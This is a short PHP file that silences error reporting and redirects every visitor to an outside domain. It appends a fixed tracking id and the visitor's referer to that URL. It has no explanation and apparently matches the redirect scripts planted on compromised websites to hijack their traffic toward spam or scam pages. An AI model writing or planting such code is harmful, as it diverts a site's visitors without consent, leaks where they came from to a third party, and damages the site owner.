<?php
error_reporting(0);
$domain = 'http://swt.mingyangshijie.cn/find';
$params = array(
    'u' => 391,
    'r' => $_SERVER['HTTP_REFERER'],
);
$url = $domain . '?' . http_build_query($params);
header('Location: '.$url);